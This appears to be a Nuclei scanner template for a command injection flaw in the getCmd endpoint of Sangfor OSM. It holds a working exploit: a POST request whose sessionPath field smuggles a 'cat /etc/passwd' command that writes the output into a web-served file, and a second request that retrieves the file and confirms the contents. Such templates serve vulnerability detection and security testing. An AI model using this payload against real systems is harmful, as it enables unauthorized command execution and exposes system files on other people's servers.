id: sangfor-osm-getcmd-injection
info:
  name: Sangfor OSM getCmd Command Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: command-injection
  description: |
    Sangfor OSM is vulnerable to a command injection vulnerability in the getCmd endpoint.

variables:
  t1: "{{rand_base(7)}}"

flow: http(1) && http(2)

http:
  - id: cmd-injection
    method: POST
    path:
      - "{{BaseURL}}/isomp-protocol/protocol/getCmd"
    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    body: "sessionPath=;cat%20/etc/passwd>/usr/local/tomcat/webapps/fort/trust/js/{{t1}}.txt;&sid=1"
    matchers:
      - type: status
        status:
          - 200

  - id: verify-injection
    method: GET
    path:
      - "{{BaseURL}}/fort/trust/js/{{t1}}.txt"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root:"
          - "/bin"
      - type: word
        words:
          - "<"
        negative: true
